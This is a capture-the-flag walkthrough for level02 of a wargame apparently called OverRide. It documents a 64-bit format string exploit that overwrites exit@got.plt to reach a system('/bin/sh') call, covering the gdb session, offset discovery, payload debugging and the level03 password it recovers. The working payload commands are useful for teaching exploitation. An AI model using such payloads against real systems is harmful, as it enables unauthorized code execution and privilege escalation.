Here, again it's a string format exploit, but this time, we don't have access to the environment variables addresses :
>level02@OverRide:~$ gdb -q level02 
>Reading symbols from /home/users/level02/level02...(no debugging symbols found)...done.
>(gdb) b main
>Breakpoint 1 at 0x400818
>(gdb) r
>Starting program: /home/users/level02/level02 
>warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
>Breakpoint 1, 0x0000000000400818 in main ()
>(gdb) x/100x *environ
>Cannot access memory at address 0xffffffffffffe5b8

With a quick look at the main function, we realized that we could jump before the execution of `system("/bin/sh")`

>0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
>0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>

Our goal is to put `0x0000000000400a85` at a jump instruction.

>(gdb) disas exit
>Dump of assembler code for function exit@plt:
>0x0000000000400710 <+0>:	jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
>0x0000000000400716 <+6>:	pushq  $0xa
>0x000000000040071b <+11>:	jmpq   0x400660
>End of assembler dump.

We first tried to overwrite the value of `0x200b12` but we couldn't make it work. We think that this address is stored inside a register, so we don't have the rights to overwrite here.
But looking into the comment of the same line, we see an other address.

>(gdb) x/gx 0x601228
>0x601228 <exit@got.plt>:	0x0000000000400716

It looks like the `eip` of the `jmpq` so we tried to overwrite this one.
First, we need the decimal value of the targeted address. : `0x0000000000400a85 = 4196997`
We then find the index of the argument to use the string format exploit : (we use %p instead of %x that we used previously, because it appears that we have 64bits addresses here)

>level02@OverRide:~$ ( python -c 'print("%p " * 10)'; python -c 'print("AAAABBBB")'; cat ) | ./level02
>===== [ Secure Access System v1.0 ] =====
>/***************************************\
>| You must login to access this system. |
>\**************************************/
>--[ Username: --[ Password: *****************************************
>0x7fffffffe3d0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe5c8 0x1f7ff9a08 0x4242424241414141 (nil) (nil)  does not have access!

>level02@OverRide:~$ ( python -c 'print("%8$p")'; python -c 'print("AAAABBBB")'; cat ) | ./level02
>===== [ Secure Access System v1.0 ] =====
>/***************************************\
>| You must login to access this system. |
>\**************************************/
>--[ Username: --[ Password: *****************************************
>0x4242424241414141 does not have access!

So now, we need to write the correct number inside the address:

```bash
( python -c 'print("%4196997x" + "%8$n")'; python -c 'print("\x28\x12\x60\x00")'; cat ) | ./level02
                                                                whoami
Segmentation fault (core dumped)
```

We got a segfault, strange.
We use `dmesg` to have more infos about this segfault :

```bash
[11031.533103] level02[3052]: segfault at a00601228 ip 00007ffff7a6827c sp 00007fffffffd2c0 error 6 in libc-2.15.so[7ffff7a1c000+1b4000]

```

Since it's 64bits addresses, when we put only 4 bytes, there is some leftovers that make the exploit writing on a bad address.
Let's fix this :

```bash
( python -c 'print("%4196997x" + "%8$n")'; python -c 'print("\x28\x12\x60\x00\x00\x00\x00\x00")'; cat ) | ./level02

         ffffe3d0 does not have access!
whoami
level03
cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

```

```bash
su level03
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```